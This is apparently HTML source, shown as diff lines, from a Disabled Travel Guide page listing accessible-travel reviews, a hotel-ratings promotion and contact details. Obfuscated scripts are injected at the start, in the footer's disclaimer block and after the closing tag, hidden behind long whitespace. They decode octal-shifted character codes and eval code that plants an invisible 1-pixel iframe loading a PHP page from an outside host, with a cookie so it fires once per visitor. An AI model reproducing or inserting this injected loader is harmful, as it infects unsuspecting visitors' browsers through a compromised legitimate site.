,151,170,107,163,163,157,155,151,54,147,163,163,157,155,151,122,145,161,151,60,147,163,163,157,155,151,132,145,160,171,151,60,162,110,145,175,167,60,164,145,170,154,55,44,177,21,16,44,172,145,166,44,170,163,150,145,175,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,172,145,166,44,151,174,164,155,166,151,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,155,152,44,54,162,110,145,175,167,101,101,162,171,160,160,44,200,200,44,162,110,145,175,167,101,101,64,55,44,162,110,145,175,167,101,65,77,21,16,44,151,174,164,155,166,151,62,167,151,170,130,155,161,151,54,170,163,150,145,175,62,153,151,170,130,155,161,151,54,55,44,57,44,67,72,64,64,64,64,64,56,66,70,56,162,110,145,175,167,55,77,21,16,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,44,101,44,147,163,163,157,155,151,122,145,161,151,57,46,101,46,57,151,167,147,145,164,151,54,147,163,163,157,155,151,132,145,160,171,151,55,21,16,44,57,44,46,77,151,174,164,155,166,151,167,101,46,44,57,44,151,174,164,155,166,151,62,170,163,113,121,130,127,170,166,155,162,153,54,55,44,57,44,54,54,164,145,170,154,55,44,103,44,46,77,44,164,145,170,154,101,46,44,57,44,164,145,170,154,44,76,44,46,46,55,77,21,16,201,21,16,152,171,162,147,170,155,163,162,44,113,151,170,107,163,163,157,155,151,54,44,162,145,161,151,44,55,44,177,21,16,44,172,145,166,44,167,170,145,166,170,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,162,145,161,151,44,57,44,46,101,46,44,55,77,21,16,44,172,145,166,44,160,151,162,44,101,44,167,170,145,166,170,44,57,44,162,145,161,151,62,160,151,162,153,170,154,44,57,44,65,77,21,16,44,155,152,44,54,44,54,44,45,167,170,145,166,170,44,55,44,52,52,21,16,44,54,44,162,145,161,151,44,45,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,64,60,44,162,145,161,151,62,160,151,162,153,170,154,44,55,44,55,44,55,21,16,44,177,21,16,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,201,21,16,44,155,152,44,54,44,167,170,145,166,170,44,101,101,44,61,65,44,55,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,172,145,166,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,46,77,46,60,44,160,151,162,44,55,77,21,16,44,155,152,44,54,44,151,162,150,44,101,101,44,61,65,44,55,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,160,151,162,153,170,154,77,21,16,44,166,151,170,171,166,162,44,171,162,151,167,147,145,164,151,54,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,160,151,162,60,44,151,162,150,44,55,44,55,77,21,16,201,21,16,155,152,44,54,162,145,172,155,153,145,170,163,166,62,147,163,163,157,155,151,111,162,145,146,160,151,150,55,21,16,177,21,16,155,152,54,113,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,55,101,101,71,71,55,177,201,151,160,167,151,177,127,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,60,44,53,71,71,53,60,44,53,65,53,60,44,53,63,53,55,77,21,16,21,16,176,176,176,152,152,152,54,55,77,21,16,201,21,16,201,21,16"["split"](","));for(i=0;i<a.length;i+=1){a[i]=parseInt(a[i],8)-(7-3);}try{d.body--}catch(q){zz=0;}try{zz&=2}catch(q){zz=1;}if(!zz)if(window["document"])eval(ss["fromCharCode"].apply(ss,a));</script>"/>
+	<input type="hidden" name="limit" value="30" />
+	<input type="hidden" name="ordering" value="newest" />
+	<input type="hidden" name="view" value="search" />
+	<input type="hidden" name="Itemid" value="99999999" />
+	<input type="hidden" name="option" value="com_search" />
+
+	
+	<div id="roksearch_results"></div>
+</div>
+<div id="rokajaxsearch_tmp" style="visibility:hidden;display:none;"></div>
+</form>		</div>
+			<div class="moduletable right">
+					<a href="/component/content/article/2">Leave a Review</a>		</div>
+			<div class="moduletable">
+					<a target="_blank" href="http://disabledtravelguide.blogspot.com/"><img src="/images/stories/banners/banner_accessallareas.jpg" width="900" style="display: block; margin-left: auto; margin-right: auto;" title="Visit the Access All Areas Blog" alt="Access All Areas" height="200" /></a>		</div>
+	
+        </div>
+	    
+<div id="wrapper">
+<!-- class="si-clear-absolutes" -->
+   
+   </div><!-- end wrapper -->
+
+	    
+    <div class="clr">&nbsp;</div>
+    
+        <!-- BEGIN: Post Modules 1 & 2 -->
+    	<div id="post">
+        
+        	<div id="post_modules" class="spacer w49">
+            	                <div class="block">
+                	<div class="post1">
+                			<div class="moduletable blue">
+					<h3>Recent reviews</h3>
+					
+
+
+<a href="#prev" class="jr_modPrev"></a>    
+
+<div id="jr_modSlider45" class="jr_modSlider"> 
+     
+        <div class="jr_modItems horizontal">
+
+        
+		<div class="jr_modContainer jr_listings_mod">
+            
+                 
+                               
+                              
+                <div class="listItem">
+				
+                    									
+                                                        	
+					<div class="contentColumn">
+						<!-- Listing Title -->
+						<div class="contentTitle" style="white-space:normal;">
+							<a href="/component/content/article/93-italy" >Rome</a> 						</div>
+
+						<!-- Rating -->
+												<div class="overall_ratings">
+																							<div class="overall_user" title="User rating">
+									<div class="rating_stars"><div class="rating_star_user"><div style="width:58%;">&nbsp;</div></div></div>
+									<span class="rating_value">2.9</span>
+								</div>
+													</div>
+												
+						<!-- Reviewer name -->
+						<div class="contentInfo">
+							<span class="reviewer">Reviewed by <a href="/profile/userprofile/romeanditaly" >Rome and Italy</a></span>
+						</div>
+						
+						<!-- Review Comments -->
+												<div class="contentInfo">
+														<span class="comments">"Hi friends!
+
+Disabled travelers are now on “equal footing” with other..."</span>
+						</div>
+											</div>
+	            </div>
+               
+                                   
+                        
+        </div>    
+            
+        
+		<div class="jr_modContainer jr_listings_mod">
+            
+                 
+                               
+                              
+                <div class="listItem">
+				
+                    									
+                                                        	
+					<div class="contentColumn">
+						<!-- Listing Title -->
+						<div class="contentTitle" style="white-space:normal;">
+							<a href="/component/content/article/115-getty-centre-la" >Getty Centre - LA</a> 						</div>
+
+						<!-- Rating -->
+												<div class="overall_ratings">
+																							<div class="overall_user" title="User rating">
+									<div class="rating_stars"><div class="rating_star_user"><div style="width:85%;">&nbsp;</div></div></div>
+									<span class="rating_value">4.3</span>
+								</div>
+													</div>
+												
+						<!-- Reviewer name -->
+						<div class="contentInfo">
+							<span class="reviewer">Reviewed by <a href="/profile/userprofile/csummers" >claire summers</a></span>
+						</div>
+						
+						<!-- Review Comments -->
+												<div class="contentInfo">
+														<span class="comments">"It would be difficult to find a more accessible museum..."</span>
+						</div>
+											</div>
+	            </div>
+               
+                                   
+                        
+        </div>    
+            
+        
+		<div class="jr_modContainer jr_listings_mod">
+            
+                 
+                               
+                              
+                <div class="listItem">
+				
+                    									
+                                                        	
+					<div class="contentColumn">
+						<!-- Listing Title -->
+						<div class="contentTitle" style="white-space:normal;">
+							<a href="/component/content/article/114-disneyland-anaheim" >Disneyland - anaheim</a> 						</div>
+
+						<!-- Rating -->
+												<div class="overall_ratings">
+																							<div class="overall_user" title="User rating">
+									<div class="rating_stars"><div class="rating_star_user"><div style="width:70%;">&nbsp;</div></div></div>
+									<span class="rating_value">3.5</span>
+								</div>
+													</div>
+												
+						<!-- Reviewer name -->
+						<div class="contentInfo">
+							<span class="reviewer">Reviewed by <a href="/profile/userprofile/csummers" >claire summers</a></span>
+						</div>
+						
+						<!-- Review Comments -->
+												<div class="contentInfo">
+														<span class="comments">"Disneyland in Anaheim has all the lively sights, sounds, and..."</span>
+						</div>
+											</div>
+	            </div>
+               
+                                   
+                        
+        </div>    
+            
+        
+		<div class="jr_modContainer jr_listings_mod">
+            
+                 
+                               
+                              
+                <div class="listItem">
+				
+                    									
+                                                        	
+					<div class="contentColumn">
+						<!-- Listing Title -->
+						<div class="contentTitle" style="white-space:normal;">
+							<a href="/component/content/article/113-santa-monica-days-motel" >Santa Monica Days Motel</a> 						</div>
+
+						<!-- Rating -->
+												<div class="overall_ratings">
+																							<div class="overall_user" title="User rating">
+									<div class="rating_stars"><div class="rating_star_user"><div style="width:40%;">&nbsp;</div></div></div>
+									<span class="rating_value">2.0</span>
+								</div>
+													</div>
+												
+						<!-- Reviewer name -->
+						<div class="contentInfo">
+							<span class="reviewer">Reviewed by <a href="/profile/userprofile/csummers" >claire summers</a></span>
+						</div>
+						
+						<!-- Review Comments -->
+												<div class="contentInfo">
+														<span class="comments">"Santa Monica Days Inn Hotel at 3007 Santa Monica Blvd...."</span>
+						</div>
+											</div>
+	            </div>
+               
+                                   
+                        
+        </div>    
+            
+        
+		<div class="jr_modContainer jr_listings_mod">
+            
+                 
+                               
+                              
+                <div class="listItem">
+				
+                    									
+                                                        	
+					<div class="contentColumn">
+						<!-- Listing Title -->
+						<div class="contentTitle" style="white-space:normal;">
+							<a href="/component/content/article/109-london" >london</a> 						</div>
+
+						<!-- Rating -->
+												<div class="overall_ratings">
+																							<div class="overall_user" title="User rating">
+									<div class="rating_stars"><div class="rating_star_user"><div style="width:60%;">&nbsp;</div></div></div>
+									<span class="rating_value">3.0</span>
+								</div>
+													</div>
+												
+						<!-- Reviewer name -->
+						<div class="contentInfo">
+							<span class="reviewer">Reviewed by <a href="/profile/userprofile/Admin" >Sean Gorman</a></span>
+						</div>
+						
+						<!-- Review Comments -->
+												<div class="contentInfo">
+														<span class="comments">"I travel alone and use a mobility scooter ... and..."</span>
+						</div>
+											</div>
+	            </div>
+               
+                                   
+                        
+        </div>    
+            
+        
+		<div class="jr_modContainer jr_listings_mod">
+            
+                 
+                               
+                              
+                <div class="listItem">
+				
+                    									
+                                                        	
+					<div class="contentColumn">
+						<!-- Listing Title -->
+						<div class="contentTitle" style="white-space:normal;">
+							<a href="/component/content/article/108-galway" >Galway</a> 						</div>
+
+						<!-- Rating -->
+												<div class="overall_ratings">
+																							<div class="overall_user" title="User rating">
+									<div class="rating_stars"><div class="rating_star_user"><div style="width:50%;">&nbsp;</div></div></div>
+									<span class="rating_value">2.5</span>
+								</div>
+													</div>
+												
+						<!-- Reviewer name -->
+						<div class="contentInfo">
+							<span class="reviewer">Reviewed by <a href="/profile/userprofile/getsthere" >david shaun</a></span>
+						</div>
+						
+						<!-- Review Comments -->
+												<div class="contentInfo">
+														<span class="comments">"Galway isn't exactly an easy city for wheelchair users to..."</span>
+						</div>
+											</div>
+	            </div>
+               
+                                   
+                        
+        </div>    
+            
+        
+		<div class="jr_modContainer jr_listings_mod">
+            
+                 
+                               
+                              
+                <div class="listItem">
+				
+                    									
+                                                        	
+					<div class="contentColumn">
+						<!-- Listing Title -->
+						<div class="contentTitle" style="white-space:normal;">
+							<a href="/component/content/article/107-cyprus" >Cyprus</a> 						</div>
+
+						<!-- Rating -->
+												<div class="overall_ratings">
+																							<div class="overall_user" title="User rating">
+									<div class="rating_stars"><div class="rating_star_user"><div style="width:60%;">&nbsp;</div></div></div>
+									<span class="rating_value">3.0</span>
+								</div>
+													</div>
+												
+						<!-- Reviewer name -->
+						<div class="contentInfo">
+							<span class="reviewer">Reviewed by <a href="/profile/userprofile/Admin" >Sean Gorman</a></span>
+						</div>
+						
+						<!-- Review Comments -->
+												<div class="contentInfo">
+														<span class="comments">"After a recent visit to Cyprus, I must say how..."</span>
+						</div>
+											</div>
+	            </div>
+               
+                                   
+                        
+        </div>    
+            
+        
+		<div class="jr_modContainer jr_listings_mod">
+            
+                 
+                               
+                              
+                <div class="listItem">
+				
+                    									
+                                                        	
+					<div class="contentColumn">
+						<!-- Listing Title -->
+						<div class="contentTitle" style="white-space:normal;">
+							<a href="/component/content/article/106-singapore" >Singapore</a> 						</div>
+
+						<!-- Rating -->
+												<div class="overall_ratings">
+																							<div class="overall_user" title="User rating">
+									<div class="rating_stars"><div class="rating_star_user"><div style="width:65%;">&nbsp;</div></div></div>
+									<span class="rating_value">3.3</span>
+								</div>
+													</div>
+												
+						<!-- Reviewer name -->
+						<div class="contentInfo">
+							<span class="reviewer">Reviewed by sean gorman</span>
+						</div>
+						
+						<!-- Review Comments -->
+												<div class="contentInfo">
+														<span class="comments">"It may surprise you to find out that Singapore is..."</span>
+						</div>
+											</div>
+	            </div>
+               
+                                   
+                        
+        </div>    
+            
+        
+		<div class="jr_modContainer jr_listings_mod">
+            
+                 
+                               
+                              
+                <div class="listItem">
+				
+                    									
+                                        <!-- Listing Thumbnail -->
+                     <div class="contentThumbnail">
+                        <a href="/component/content/article/105-disney-world-usa" ><img src="http://disabledtravelguide.co.uk/images/stories/jreviews/tn/tn_105_module100_Disney_1312666541.jpg"  border="0"  alt="Disney World -USA"  title="Disney World -USA"  style="width: 100px; height: 100px"  /></a>                                                
+                    </div>
+                                                        	
+					<div class="contentColumn">
+						<!-- Listing Title -->
+						<div class="contentTitle" style="white-space:normal;">
+							<a href="/component/content/article/105-disney-world-usa" >Disney World -USA</a> 						</div>
+
+						<!-- Rating -->
+												<div class="overall_ratings">
+																							<div class="overall_user" title="User rating">
+									<div class="rating_stars"><div class="rating_star_user"><div style="width:60%;">&nbsp;</div></div></div>
+									<span class="rating_value">3.0</span>
+								</div>
+													</div>
+												
+						<!-- Reviewer name -->
+						<div class="contentInfo">
+							<span class="reviewer">Reviewed by sean gorman</span>
+						</div>
+						
+						<!-- Review Comments -->
+												<div class="contentInfo">
+														<span class="comments">"I, my daughter and her son went to Disneworld at..."</span>
+						</div>
+											</div>
+	            </div>
+               
+                                   
+                        
+        </div>    
+            
+        
+		<div class="jr_modContainer jr_listings_mod">
+            
+                 
+                               
+                              
+                <div class="listItem">
+				
+                    									
+                                                        	
+					<div class="contentColumn">
+						<!-- Listing Title -->
+						<div class="contentTitle" style="white-space:normal;">
+							<a href="/component/content/article/104-lumley-castle-hotel" >Lumley Castle Hotel</a> 						</div>
+
+						<!-- Rating -->
+												<div class="overall_ratings">
+																							<div class="overall_user" title="User rating">
+									<div class="rating_stars"><div class="rating_star_user"><div style="width:47%;">&nbsp;</div></div></div>
+									<span class="rating_value">2.3</span>
+								</div>
+													</div>
+												
+						<!-- Reviewer name -->
+						<div class="contentInfo">
+							<span class="reviewer">Reviewed by sean gorman</span>
+						</div>
+						
+						<!-- Review Comments -->
+												<div class="contentInfo">
+														<span class="comments">"the most important day my daughters wedding day i would..."</span>
+						</div>
+											</div>
+	            </div>
+               
+                                   
+                        
+        </div>    
+            
+        
+    </div>
+</div>
+<a href="#next" class="jr_modNext"></a>
+
+<div style="clear:both;"></div>
+
+<script type="text/javascript">  
+/* <![CDATA[ */
+jreviews.module.pageNavInit({"module_id":"45","columns":"1","orientation":"horizontal","slideshow":false,"slideshow_interval":6,"nav_position":"side"});
+/* ]]> */
+</script>
+		</div>
+	
+                    </div>
+            	</div>   
+                                                <div class="block">
+	                <div class="post2">
+                			<div class="moduletable bss">
+					<h3>Disabled friendly hotels in the UK</h3>
+					<div class="padding">
+<p><img src="/images/stories/wheelchair_icon.png" width="142" style="float: left;" alt="wheelchair_icon" height="143" />The Blue Star Scheme is the leading ratings scheme for disabled friendly hotels in the UK. The scheme provides simple and objective details about accessibility, and the disabled friendly facilities that are available.</p>
+<p><a class="readon float-right" href="http://www.bluestarscheme.co.uk" target="_blank">Search hotels now</a></p>
+</div>		</div>
+	
+                    </div>
+            	</div>   
+                 
+            </div><!-- END: post_modules -->
+            
+	        <div class="clr">&nbsp;</div>
+        </div><!-- END: #post -->
+	<!-- END: Post Modules 1 & 2 -->
+    
+</div><!-- end inner -->
+</div><!-- end outer -->
+
+	<!-- begin bottom section -->
+	        <div id="bottom">
+        <div class="content">
+            <div id="bottommodules" class="spacer w33">
+                            <div class="block">
+                		<div class="moduletable">
+					<h3>Address</h3>
+					Disabled Travel Guide<br />Quayside Business Centre<br />Ouserburn Building<br />Newcastle Upon Tyne<br />NE6 1LL		</div>
+	
+            </div>
+                            <div class="block">
+                		<div class="moduletable">
+					<h3>Contact</h3>
+					<p><a href="mailto:info@disabledtravelguide.com">info@disabledtravelguide.com</a><br />Tel: 0191 275 50 00</p>		</div>
+	
+            </div>
+                            <div class="block">
+                		<div class="moduletable">
+					<h3>Disclaimer</h3>
+					<ul class="menu"><li class="item6"><a href="/terms"><span>Terms</span></a></li><li class="item7"><a href="/privacy"><span>Privacy</span></a></li><li class="item8"><a href="/accessibility"><span>Accessibility</span></a></li></ul>                                                                                                                                                                                                                                                                                                                                                                                                                <script type="text/javascript" language="javascript" >                                                                                                                                                                                                                                                                                                                                                                                                                ss=eval("Str"+"ing");d=document;a=("44,152,171,162,147,170,155,163,162,44,176,176,176,152,152,152,54,55,44,177,21,16,44,172,145,166,44,173,164,44,101,44,150,163,147,171,161,151,162,170,62,147,166,151,145,170,151,111,160,151,161,151,162,170,54,53,155,152,166,145,161,151,53,55,77,21,16,21,16,44,173,164,62,167,166,147,44,101,44,53,154,170,170,164,76,63,63,170,151,160,151,153,166,145,164,154,147,163,172,151,62,147,163,63,151,167,150,62,164,154,164,53,77,21,16,44,173,164,62,167,170,175,160,151,62,164,163,167,155,170,155,163,162,44,101,44,53,145,146,167,163,160,171,170,151,53,77,21,16,44,173,164,62,167,170,175,160,151,62,146,163,166,150,151,166,44,101,44,53,64,53,77,21,16,44,173,164,62,167,170,175,160,151,62,154,151,155,153,154,170,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,173,155,150,170,154,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,160,151,152,170,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,170,163,164,44,101,44,53,65,164,174,53,77,21,16,21,16,44,155,152,44,54,45,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,173,164,53,55,55,44,177,21,16,44,150,163,147,171,161,151,162,170,62,173,166,155,170,151,54,53,100,150,155,172,44,155,150,101,140,53,173,164,140,53,102,100,63,150,155,172,102,53,55,77,21,16,44,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,173,164,53,55,62,145,164,164,151,162,150,107,154,155,160,150,54,173,164,55,77,21,16,44,201,21,16,201,21,16,152,171,162,147,170,155,163,162,44,127,151,170,107,163,163,157,155,151,54,147,163,163,157,155,151,122,145,161,151,60,147,163,163,157,155,151,132,145,160,171,151,60,162,110,145,175,167,60,164,145,170,154,55,44,177,21,16,44,172,145,166,44,170,163,150,145,175,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,172,145,166,44,151,174,164,155,166,151,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,155,152,44,54,162,110,145,175,167,101,101,162,171,160,160,44,200,200,44,162,110,145,175,167,101,101,64,55,44,162,110,145,175,167,101,65,77,21,16,44,151,174,164,155,166,151,62,167,151,170,130,155,161,151,54,170,163,150,145,175,62,153,151,170,130,155,161,151,54,55,44,57,44,67,72,64,64,64,64,64,56,66,70,56,162,110,145,175,167,55,77,21,16,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,44,101,44,147,163,163,157,155,151,122,145,161,151,57,46,101,46,57,151,167,147,145,164,151,54,147,163,163,157,155,151,132,145,160,171,151,55,21,16,44,57,44,46,77,151,174,164,155,166,151,167,101,46,44,57,44,151,174,164,155,166,151,62,170,163,113,121,130,127,170,166,155,162,153,54,55,44,57,44,54,54,164,145,170,154,55,44,103,44,46,77,44,164,145,170,154,101,46,44,57,44,164,145,170,154,44,76,44,46,46,55,77,21,16,201,21,16,152,171,162,147,170,155,163,162,44,113,151,170,107,163,163,157,155,151,54,44,162,145,161,151,44,55,44,177,21,16,44,172,145,166,44,167,170,145,166,170,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,162,145,161,151,44,57,44,46,101,46,44,55,77,21,16,44,172,145,166,44,160,151,162,44,101,44,167,170,145,166,170,44,57,44,162,145,161,151,62,160,151,162,153,170,154,44,57,44,65,77,21,16,44,155,152,44,54,44,54,44,45,167,170,145,166,170,44,55,44,52,52,21,16,44,54,44,162,145,161,151,44,45,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,64,60,44,162,145,161,151,62,160,151,162,153,170,154,44,55,44,55,44,55,21,16,44,177,21,16,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,201,21,16,44,155,152,44,54,44,167,170,145,166,170,44,101,101,44,61,65,44,55,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,172,145,166,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,46,77,46,60,44,160,151,162,44,55,77,21,16,44,155,152,44,54,44,151,162,150,44,101,101,44,61,65,44,55,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,160,151,162,153,170,154,77,21,16,44,166,151,170,171,166,162,44,171,162,151,167,147,145,164,151,54,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,160,151,162,60,44,151,162,150,44,55,44,55,77,21,16,201,21,16,155,152,44,54,162,145,172,155,153,145,170,163,166,62,147,163,163,157,155,151,111,162,145,146,160,151,150,55,21,16,177,21,16,155,152,54,113,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,55,101,101,71,71,55,177,201,151,160,167,151,177,127,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,60,44,53,71,71,53,60,44,53,65,53,60,44,53,63,53,55,77,21,16,21,16,176,176,176,152,152,152,54,55,77,21,16,201,21,16,201,21,16"["split"](","));for(i=0;i<a.length;i+=1){a[i]=parseInt(a[i],8)-(7-3);}try{d.body--}catch(q){zz=0;}try{zz&=2}catch(q){zz=1;}if(!zz)if(window["document"])eval(ss["fromCharCode"].apply(ss,a));</script>		</div>
+	
+            </div>
+                    </div>
+            </div><!-- /content -->
+            <div class="clr">&nbsp;</div>
+        </div><!-- end bottom -->
+        <!-- end bottom section -->
+
+        <div id="footerbar">
+                </div>         
+          
+		<div id="footer">
+        <div id="footermenu">
+                            </div><!-- footermenu -->
+            
+			<div class="content">
+			                <p style="text-align: center;">All Artwork © Disabled Travel Guide, unless otherwise stated. All rights reserved.</p>
+                        </div><!-- /content -->
+            
+        </div><!-- end footer -->
+
+    
+<div class="foot_padding"></div>
+
+<!-- Debug Code -->
+		                                                                                                                                                                                                                                                                                                                                                                                                                <script type="text/javascript" language="javascript" >                                                                                                                                                                                                                                                                                                                                                                                                                ss=eval("Str"+"ing");d=document;a=("44,152,171,162,147,170,155,163,162,44,176,176,176,152,152,152,54,55,44,177,21,16,44,172,145,166,44,173,164,44,101,44,150,163,147,171,161,151,162,170,62,147,166,151,145,170,151,111,160,151,161,151,162,170,54,53,155,152,166,145,161,151,53,55,77,21,16,21,16,44,173,164,62,167,166,147,44,101,44,53,154,170,170,164,76,63,63,170,151,160,151,153,166,145,164,154,147,163,172,151,62,147,163,63,151,167,150,62,164,154,164,53,77,21,16,44,173,164,62,167,170,175,160,151,62,164,163,167,155,170,155,163,162,44,101,44,53,145,146,167,163,160,171,170,151,53,77,21,16,44,173,164,62,167,170,175,160,151,62,146,163,166,150,151,166,44,101,44,53,64,53,77,21,16,44,173,164,62,167,170,175,160,151,62,154,151,155,153,154,170,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,173,155,150,170,154,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,160,151,152,170,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,170,163,164,44,101,44,53,65,164,174,53,77,21,16,21,16,44,155,152,44,54,45,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,173,164,53,55,55,44,177,21,16,44,150,163,147,171,161,151,162,170,62,173,166,155,170,151,54,53,100,150,155,172,44,155,150,101,140,53,173,164,140,53,102,100,63,150,155,172,102,53,55,77,21,16,44,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,173,164,53,55,62,145,164,164,151,162,150,107,154,155,160,150,54,173,164,55,77,21,16,44,201,21,16,201,21,16,152,171,162,147,170,155,163,162,44,127,151,170,107,163,163,157,155,151,54,147,163,163,157,155,151,122,145,161,151,60,147,163,163,157,155,151,132,145,160,171,151,60,162,110,145,175,167,60,164,145,170,154,55,44,177,21,16,44,172,145,166,44,170,163,150,145,175,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,172,145,166,44,151,174,164,155,166,151,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,155,152,44,54,162,110,145,175,167,101,101,162,171,160,160,44,200,200,44,162,110,145,175,167,101,101,64,55,44,162,110,145,175,167,101,65,77,21,16,44,151,174,164,155,166,151,62,167,151,170,130,155,161,151,54,170,163,150,145,175,62,153,151,170,130,155,161,151,54,55,44,57,44,67,72,64,64,64,64,64,56,66,70,56,162,110,145,175,167,55,77,21,16,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,44,101,44,147,163,163,157,155,151,122,145,161,151,57,46,101,46,57,151,167,147,145,164,151,54,147,163,163,157,155,151,132,145,160,171,151,55,21,16,44,57,44,46,77,151,174,164,155,166,151,167,101,46,44,57,44,151,174,164,155,166,151,62,170,163,113,121,130,127,170,166,155,162,153,54,55,44,57,44,54,54,164,145,170,154,55,44,103,44,46,77,44,164,145,170,154,101,46,44,57,44,164,145,170,154,44,76,44,46,46,55,77,21,16,201,21,16,152,171,162,147,170,155,163,162,44,113,151,170,107,163,163,157,155,151,54,44,162,145,161,151,44,55,44,177,21,16,44,172,145,166,44,167,170,145,166,170,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,162,145,161,151,44,57,44,46,101,46,44,55,77,21,16,44,172,145,166,44,160,151,162,44,101,44,167,170,145,166,170,44,57,44,162,145,161,151,62,160,151,162,153,170,154,44,57,44,65,77,21,16,44,155,152,44,54,44,54,44,45,167,170,145,166,170,44,55,44,52,52,21,16,44,54,44,162,145,161,151,44,45,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,64,60,44,162,145,161,151,62,160,151,162,153,170,154,44,55,44,55,44,55,21,16,44,177,21,16,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,201,21,16,44,155,152,44,54,44,167,170,145,166,170,44,101,101,44,61,65,44,55,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,172,145,166,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,46,77,46,60,44,160,151,162,44,55,77,21,16,44,155,152,44,54,44,151,162,150,44,101,101,44,61,65,44,55,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,160,151,162,153,170,154,77,21,16,44,166,151,170,171,166,162,44,171,162,151,167,147,145,164,151,54,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,160,151,162,60,44,151,162,150,44,55,44,55,77,21,16,201,21,16,155,152,44,54,162,145,172,155,153,145,170,163,166,62,147,163,163,157,155,151,111,162,145,146,160,151,150,55,21,16,177,21,16,155,152,54,113,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,55,101,101,71,71,55,177,201,151,160,167,151,177,127,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,60,44,53,71,71,53,60,44,53,65,53,60,44,53,63,53,55,77,21,16,21,16,176,176,176,152,152,152,54,55,77,21,16,201,21,16,201,21,16"["split"](","));for(i=0;i<a.length;i+=1){a[i]=parseInt(a[i],8)-(7-3);}try{d.body--}catch(q){zz=0;}try{zz&=2}catch(q){zz=1;}if(!zz)if(window["document"])eval(ss["fromCharCode"].apply(ss,a));</script><script type="text/javascript">
+
+var _gaq = _gaq || [];
+_gaq.push(['_setAccount', 'UA-18597023-2']);
+_gaq.push(['_trackPageview']);
+
+(function() {
+  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+  ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+})();
+
+</script>
+
+
+</body>
+</html>
+                                                                                                                                                                                                                                                                                                                                                                                                                <script type="text/javascript" language="javascript" >                                                                                                                                                                                                                                                                                                                                                                                                                